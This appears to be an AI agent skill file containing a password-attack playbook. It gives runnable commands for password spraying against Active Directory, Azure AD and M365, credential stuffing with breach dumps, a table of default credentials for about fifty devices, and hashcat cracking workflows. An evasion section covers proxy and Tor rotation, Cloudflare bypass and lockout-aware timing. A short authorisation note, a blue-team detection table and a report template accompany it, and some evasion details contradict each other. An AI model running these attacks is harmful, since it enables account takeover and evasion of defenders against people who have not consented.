---
id: password-attacks
name: password-attacks
description: >
  Password and credential attack specialist for authorized penetration tests.
  Covers password spray methodology (timing, lockout evasion, single-password-many-users),
  credential stuffing with HIBP integration, a default credential database for top 50 services,
  hash cracking workflow (hashcat modes: straight/combinator/mask/hybrid, top rule files),
  rainbow table usage, cloud-specific password spray (MSOLSpray for Azure AD, o365spray),
  detection evasion techniques, and a structured finding schema. Use when attacking or auditing
  password hygiene, account lockout policies, or credential-based authentication in any environment.
triggers:
  - password spray
  - credential stuffing
  - brute force
  - hash cracking
  - default credentials
  - hashcat
  - MSOLSpray
  - o365spray
  - password attack
  - rockyou
  - HIBP
  - credential dump
  - lockout bypass
  - password audit
version: "1.0"
verified: "2026-10-30"
---

# Password and Credential Attack Specialist

> **Scope gate:** all techniques require an authorized engagement (pentest scope, bug-bounty program, or lab). Never spray, stuff, or crack credentials against systems you do not have written permission to test.

---

## 1. Attack Surface and Decision Tree

```
Target exposes authentication?
├── Web login / API key endpoint
│   ├── No lockout → brute force (targeted) or credential stuffing
│   ├── Lockout present → password spray (1-2 guesses / account / window)
│   └── MFA present → spray for valid accounts, pivot to MFA bypass
├── Cloud identity (Azure AD / M365 / AWS)
│   └── → Cloud spray (MSOLSpray / o365spray / Spray365)
├── Network service (SSH, SMB, RDP, SMTP, FTP)
│   └── → Hydra / Medusa / Ncrack
└── Got hashes? → offline hash cracking (hashcat)
    ├── NTLM (from Secretsdump, Responder)
    ├── bcrypt / Argon2 / scrypt (web apps)
    └── MD5 / SHA1 (legacy)
```

---

## 2. Password Spray Methodology

### 2.1 Concept: Single Password → Many Users

Password spray inverts traditional brute force: instead of many passwords against one account (which triggers lockout), one or a few passwords are tried against ALL accounts. This stays below per-account lockout thresholds while achieving wide coverage.

**Core rule:** never exceed `(lockout_threshold - 1)` attempts per account per observation window.

```
Example:
  Lockout threshold: 5 attempts / 30 minutes
  Safe spray rate:   4 attempts / 30 minutes → 1 guess per ~8 minutes
```

### 2.2 Pre-Spray Reconnaissance

```bash
# Enumerate valid usernames before spraying (reduces noise)
# LDAP enumeration (internal)
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName

# SMTP user enumeration (external mail servers that reply differently per user)
smtp-user-enum -M RCPT -U users.txt -t mail.target.com

# O365 / Azure AD user enumeration (no auth required)
python3 o365spray.py --validate --domain target.com
```

### 2.3 Password List Selection

**Tier 1 — highest success rate:**
- `Password1`, `Password123`, `Welcome1`, `Summer2024!`, `Winter2025!` — seasonal patterns dominate enterprise environments
- `<CompanyName>2024!`, `<CompanyName>123` — name-based passwords
- `Monday1`, `January1` — month/weekday patterns

**Tier 2 — secondary spray round (after ≥4-hour wait):**
- `Passw0rd!`, `P@ssword1`, `Qwerty123!`

**Build a custom list from OSINT:**
```bash
# cewl — spider target website for likely password words
cewl https://target.com -d 3 -m 6 -w custom_words.txt

# Combine with rules for password candidates
hashcat --stdout custom_words.txt -r /usr/share/hashcat/rules/best64.rule > spray_candidates.txt
```

### 2.4 Lockout Evasion Timing

```python
# Pseudocode — spray one password across all users, then wait
for password in spray_passwords:
    for user in user_list:
        attempt(user, password)
        sleep(DELAY_BETWEEN_ATTEMPTS)  # e.g. 30-60 seconds
    sleep(WINDOW_WAIT)  # e.g. 35 minutes — longer than lockout reset window
```

**Practical timings:**
- Default AD policy: 30-minute observation window → wait 35 minutes between rounds
- No policy found: assume 30 minutes; verify with LDAP `lockoutObservationWindow`
- Cloud (Azure AD Smart Lockout): 10 attempts / minute default; spray at 1 attempt / 60 s

### 2.5 Tools

```bash
# Spray (generic — web forms, NTLM, Kerberos)
# kerbrute — fast Kerberos pre-auth spray (does NOT trigger normal lockout counters)
./kerbrute passwordspray -d domain.com --dc DC_IP users.txt 'Password2025!'

# spray.sh — simple HTTP form spray
spray.sh http://target/login user_field pass_field users.txt 'Summer2025!'

# CrackMapExec (CME) / NetExec — SMB, LDAP, SSH spray
nxc smb DC_IP -u users.txt -p 'Password1' --continue-on-success

# Ruler — Exchange / EWS (OWA) spray
ruler --domain target.com spray --users users.txt --passwords passwords.txt --delay 0 --sleep 5
```

---

## 3. Credential Stuffing

### 3.1 Concept

Credential stuffing uses **real username:password pairs** from previous breaches, betting that users reuse credentials across services. Unlike spray (one pass per window), stuffing goes fast with unique pairs — each pair is tried once, so lockout is avoided if the service uses per-account thresholds.

### 3.2 HIBP Integration

```bash
# Check if a specific email appears in known breaches (API key required)
curl -H "hibp-api-key: YOUR_KEY" \
     "https://haveibeenpwned.com/api/v3/breachedaccount/user@target.com?truncateResponse=false"

# Bulk check via haveibeenpwned CLI
pip install pwnedpasswords
pwnedpasswords check 'PasswordToCheck'  # k-anonymity model — safe to use

# Download the HIBP password hash list (NTLM + SHA1 sorted)
# https://haveibeenpwned.com/Passwords — download "ordered by hash" for offline use
# Use to audit an internal hash dump: cross-reference NTLM hashes
```

### 3.3 Stuffing Workflow

```bash
# 1. Obtain a breach dump for the target domain (OSINT — Dehashed, LeakCheck, IntelX)
# Format: user@target.com:plaintext_or_hash

# 2. Filter to target domain
grep "@target\.com" breach_dump.txt > target_creds.txt

# 3. If hashes present, crack offline first (§5), then stuff with plaintext
# 4. Feed plaintext pairs to stuffing tool

# Sentry MBA / STORM (GUI tools for credential stuffing — widely used in authorized tests)
# ffuf-based stuffing for web login forms
ffuf -w target_creds.txt:FUZZ \
     -u https://target.com/login \
     -X POST -d "username=FUZZUSER&password=FUZZPASS" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -fw 200  # filter by word count of failure response

# Hydra — protocol stuffing
hydra -C target_creds.txt target.com https-post-form \
      "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

### 3.4 Evasion During Stuffing

- Rotate IPs via residential proxies or the target's own CDN IP range (Cloudflare bypass techniques apply).
- Randomize `User-Agent` and browser fingerprint (`tls-fingerprint` skill for JA3 rotation).
- Introduce random delays between requests (0.5–5 seconds jitter).
- Distribute requests across time zones / business hours.

---

## 4. Default Credential Database (Top 50 Services)

| Service | Default Username | Default Password | Notes |
|---------|-----------------|-----------------|-------|
| Cisco IOS | admin | (blank) / cisco | varies by model |
| Cisco ASA | admin | admin | |
| Juniper Junos | root | (blank) | SSH key auth after first login |
| Palo Alto PAN-OS | admin | admin | |
| FortiGate | admin | (blank) | |
| SonicWall | admin | password | |
| Ubiquiti UniFi | ubnt | ubnt | SSH |
| MikroTik RouterOS | admin | (blank) | |
| QNAP NAS | admin | admin / (blank) | |
| Synology NAS | admin | admin | |
| VMware vCenter | administrator@vsphere.local | (varies) | set at install |
| VMware ESXi | root | (blank) / vmware | |
| Proxmox VE | root | (set at install) | |
| Jenkins | admin | (from initialAdminPassword file) | |
| GitLab CE | root | 5iveL!fe / set on first login | pre-12.0 default |
| Jira | admin | admin | |
| Confluence | admin | admin | |
| Grafana | admin | admin | CVE-2021-43798 path traversal |
| Kibana | elastic | changeme | |
| Elasticsearch | elastic | changeme | when security enabled |
| RabbitMQ | guest | guest | localhost-only by default |
| Redis | (none) | (none) | no auth by default |
| MongoDB | (none) | (none) | no auth by default — always check |
| MySQL | root | (blank) | |
| MSSQL | sa | sa / (blank) | |
| PostgreSQL | postgres | postgres | |
| Oracle DB | sys | change_on_install | |
| Oracle DB | system | manager | |
| Tomcat Manager | tomcat | tomcat / s3cret | |
| JBoss / WildFly | admin | admin | |
| WebLogic | weblogic | weblogic / welcome1 | |
| phpMyAdmin | root | (blank) | |
| Adminer | root | (blank) | |
| pfSense | admin | pfsense | |
| OpenWRT | root | (blank) | |
| DD-WRT | root | admin | |
| HP iLO | Administrator | (printed on server tag) | |
| Dell iDRAC | root | calvin | |
| Supermicro IPMI | ADMIN | ADMIN | |
| Lenovo IMM | USERID | PASSW0RD | |
| Printer (HP) | admin | admin / (blank) | EWS web interface |
| Printer (Ricoh) | admin | (blank) / password | |
| Printer (Xerox) | admin | 1111 | |
| IP Camera (Hikvision) | admin | 12345 | many still unpatched |
| IP Camera (Dahua) | admin | admin | |
| SCADA (Siemens S7) | admin | admin / (blank) | |
| Netgear | admin | password | |
| D-Link | admin | (blank) / admin | |
| TP-Link | admin | admin | |
| Linksys | admin | admin | |

**Scan for defaults at scale:**
```bash
# Use nuclei with default-login templates
nuclei -t /nuclei-templates/default-logins/ -l targets.txt

# Use Metasploit auxiliary modules
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS target_range
run
```

---

## 5. Hash Cracking Workflow

### 5.1 Identify the Hash

```bash
# hashid / hash-identifier
hashid '$2y$10$...'         # → bcrypt
hashid 'aad3b435b51404...'  # → NTLM
hashcat --example-hashes | grep -A2 "NTLM"

# hashcat hash type codes (commonly needed)
# -m 1000  NTLM
# -m 5600  NetNTLMv2
# -m 13100 Kerberos 5 TGS (RC4) — Kerberoasting
# -m 18200 Kerberos 5 AS-REP — AS-REP roasting
# -m 3200  bcrypt $2*$
# -m 1800  sha512crypt $6$
# -m 500   md5crypt $1$
# -m 0     MD5 (raw)
# -m 100   SHA1 (raw)
# -m 1400  SHA256 (raw)
```

### 5.2 Attack Modes

**Mode 0 — Straight (dictionary):**
```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Mode 1 — Combinator (two wordlists concatenated):**
```bash
hashcat -m 1000 -a 1 hashes.txt words1.txt words2.txt
# Tries every combination: word1+word2
```

**Mode 3 — Brute Force / Mask:**
```bash
# All 8-char alphanumeric
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# Mask for common enterprise passwords: Capital+6lower+2digit
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?l?d?d

# Mask charset:
# ?l = lowercase  ?u = uppercase  ?d = digit
# ?s = special    ?a = all printable  ?b = 0x00-0xff
```

**Mode 6 — Hybrid (wordlist + mask):**
```bash
# Append 2 digits to every rockyou word
hashcat -m 1000 -a 6 hashes.txt rockyou.txt ?d?d

# Prepend 2 digits to every word
hashcat -m 1000 -a 7 hashes.txt ?d?d rockyou.txt
```

### 5.3 Rule Files

Rules mutate wordlist entries on the fly (capitalize, append special chars, leet-speak, etc.).

```bash
# best64.rule — 64 high-yield rules; fastest, best ROI for NTLM
hashcat -m 1000 -a 0 -r /usr/share/hashcat/rules/best64.rule hashes.txt rockyou.txt

# OneRuleToRuleThemAll — community mega-rule set (~50k rules)
# https://github.com/NotSoSecure/password_cracking_rules
hashcat -m 1000 -a 0 -r OneRuleToRuleThemAll.rule hashes.txt rockyou.txt

# dive.rule — statistically best rule set (2023–2026 benchmarks)
# https://github.com/hashcat/hashcat/blob/master/rules/dive.rule
hashcat -m 1000 -a 0 -r rules/dive.rule hashes.txt rockyou.txt

# Combination: rockyou + best64 → ~1.3 billion candidates
# Combination: rockyou + OneRule → ~14 billion candidates (GPU-dependent)
```

**Recommended cracking order (efficiency-first):**
```
1. Straight + rockyou.txt (no rules) — fastest
2. Straight + rockyou.txt + best64.rule
3. Straight + custom wordlist (cewl + target OSINT) + best64.rule
4. Straight + rockyou.txt + OneRuleToRuleThemAll.rule
5. Mask: ?u?l?l?l?l?l?d?d?s (common enterprise pattern)
6. Hybrid: rockyou.txt + ?d?d / ?d?d?d?d
7. Brute force masks (≤8 char) — last resort
```

### 5.4 Rainbow Tables

```bash
# Precomputed hash chains — fast lookup, large storage cost
# Use rtgen / rcracki_mt from the RainbowCrack project
# Effective for MD5/NTLM without salt; useless for bcrypt/scrypt (salted by design)

# Online rainbow tables (for unsalted MD5/SHA1/NTLM):
# https://crackstation.net — free, 15 billion entries
# https://hashes.com/en/decrypt/hash — community crack
# https://hashtoolkit.com

# Practical workflow for NTLM:
# 1. Try crackstation.net first (seconds, free)
# 2. If not found: hashcat with wordlists
# 3. Rainbow tables only if hashcat exhausted and you have the storage
```

### 5.5 Performance Tuning

```bash
# Benchmark your hardware
hashcat -b

# Optimize for speed
hashcat -m 1000 -a 0 -O -w 3 hashes.txt rockyou.txt
# -O: enable optimized kernel (faster, ≤32 char passwords)
# -w 3: high workload profile (uses GPU maximally)

# Distributed cracking: hashcat with --brain server
# or split hash file across multiple machines
```

---

## 6. Cloud Password Spray

### 6.1 Azure AD / Microsoft 365 — MSOLSpray

```bash
# https://github.com/dafthack/MSOLSpray
Import-Module MSOLSpray.ps1
Invoke-MSOLSpray -UserList users.txt -Password "Spring2025!" -Verbose

# Outputs: SUCCESS / BADPASSWD / LOCKED / DISABLED / MFA_REQUIRED
# MFA_REQUIRED = valid creds! (just can't complete without MFA)
```

**Azure Smart Lockout evasion:**
- Smart Lockout resets after 10+ failed attempts from one IP but NOT across multiple IPs.
- Use `--sleep` parameter or distribute across multiple Azure egress IPs.
- Familiarized IPs (from Azure AD "trusted IPs") get higher thresholds.

### 6.2 Microsoft 365 — o365spray

```bash
# https://github.com/0xZDH/o365spray
# Enumerate valid users first (no auth required)
python3 o365spray.py --validate --domain target.com

# Spray
python3 o365spray.py --spray -U users.txt -P passwords.txt \
    --count 1 --lockout 5 --domain target.com
```

### 6.3 Spray365 (AWS / Azure / GCP Unified)

```bash
# https://github.com/MarkoH17/Spray365
# Supports user-agent rotation, IP rotation via proxy, resume capability
python3 spray365.py generate -ep execution_plan.json \
    -d domain.com -u users.txt -p passwords.txt \
    --delay 30 --jitter 10

python3 spray365.py spray execution_plan.json
```

### 6.4 AWS IAM Spray

```bash
# AWS has no native lockout — but CloudTrail logs every attempt
# spray AWS console login (https://console.aws.amazon.com)
# or API via boto3
import boto3
client = boto3.client('iam')
# Try assume-role or GetCallerIdentity with long-term key pairs
```

---

## 7. Detection Evasion

| Technique | Implementation |
|-----------|---------------|
| Rate limiting (spray) | ≤1 attempt per 60s per account; match to lockout window |
| IP rotation | Residential proxy pools; tor exit nodes for low-value testing |
| User-Agent rotation | Randomize from real browser UA list per request |
| TLS fingerprint | Use `tls-fingerprint` skill to match curl_cffi browser preset |
| Distributed timing | Randomize ±50% jitter around base delay |
| Geographic spread | Use proxies in the target's home country (less anomalous) |
| Credential ordering | Most-common-password first across all users before moving to second |
| Valid user-only spray | Enumerate valid users first; skip invalid to reduce log noise |
| Off-hours spraying | Spray during target business hours (normal user login volume masks it) |

---

## 8. Detection Signals (for Blue Team)

| Attack | Detection |
|--------|-----------|
| Password spray | Many `4625`/`EventID 4625` (failed logon) across many usernames from one source; uniform timestamps |
| Credential stuffing | High failure rate with occasional success; diverse source IPs; known breach email patterns |
| Hash cracking (offline) | No network signal; detect via hash exfiltration (Secretsdump → `4662`, `4688`) |
| Cloud spray (Azure) | Azure AD `Sign-in logs` → many "Invalid password" from one IP in short window; `UserRiskLevel` elevation |
| Kerbrute spray | Kerberos `AS-REQ` without pre-auth (`Event 4768` with `0x18` failure code) from unusual source |
| Default creds hit | Successful login from service account with default password; anomalous login time/IP |

---

## 9. Finding Schema

```
Title: [Password Spray / Credential Stuffing / Default Credentials] — [Impact]
Severity: Critical / High / Medium
CVSSv3.1: [score] [vector]
CWE: CWE-521 (Weak Password) / CWE-307 (Lockout) / CWE-1391 (Default Credentials)

Affected service: [URL / IP / protocol]
Attack type: [spray | stuffing | default | brute force]
Valid accounts found: [count] / [total enumerated]
Accounts compromised: [list if appropriate for report]

Steps to reproduce:
  1. [Tool and command]
  2. [Timing / rounds]
  3. [Evidence: successful login screenshot]

Impact:
  [Account takeover / lateral movement / data access]

Evidence:
  [Hashcat potfile excerpt / tool output / screenshot]

Remediation:
  - Enforce MFA on all accounts (eliminates spray as a complete attack)
  - Implement lockout: 5 attempts / 30 minutes
  - Deploy Azure AD Password Protection / custom banned password list
  - Monitor for spray patterns (EventID 4625 correlation)
  - Rotate/remove default credentials; use secrets manager

References:
  - NIST SP 800-63B §5.1.1
  - CIS Controls v8 — Control 5 (Account Management)
  - OWASP ASVS v5 — V2 Authentication
```

---

## 10. Quick Reference Cheatsheet

```bash
# ── SPRAY ──────────────────────────────────────────────────────────────
# Kerbrute (Kerberos, no lockout increment on most DCs)
kerbrute passwordspray -d corp.local --dc 10.0.0.1 users.txt 'Summer2025!'

# NetExec (SMB)
nxc smb 10.0.0.1 -u users.txt -p 'Password1' --continue-on-success

# ── CREDENTIAL STUFFING ────────────────────────────────────────────────
hydra -C creds.txt target.com https-post-form "/login:u=^USER^&p=^PASS^:F=failed"

# ── HASH CRACKING ──────────────────────────────────────────────────────
hashcat -m 1000 -a 0 -O -w 3 ntlm_hashes.txt rockyou.txt -r best64.rule
hashcat -m 13100 -a 0 -O kerberoast.txt rockyou.txt -r OneRuleToRuleThemAll.rule

# ── DEFAULT CREDS ──────────────────────────────────────────────────────
nuclei -t default-logins/ -l targets.txt -o default_creds_findings.txt

# ── CLOUD SPRAY ────────────────────────────────────────────────────────
python3 o365spray.py --validate --domain corp.com
python3 o365spray.py --spray -U users.txt -P passwords.txt --count 1 --lockout 5 --domain corp.com
```

---

## 11. References

- NIST SP 800-63B — Digital Identity Guidelines: Authentication
- OWASP Testing Guide v4.2 — OTG-AUTHN-003 (Testing for Weak Lock Out Mechanism)
- OWASP ASVS v5 — V2 Authentication Verification Requirements
- CIS Controls v8 — Control 5: Account Management
- Microsoft — Azure AD Smart Lockout documentation
- HaveIBeenPwned API — https://haveibeenpwned.com/API/v3
- hashcat wiki — https://hashcat.net/wiki/
- Practical Password Spraying — SpectorOps blog
- dafthack/MSOLSpray — github.com/dafthack/MSOLSpray
- 0xZDH/o365spray — github.com/0xZDH/o365spray
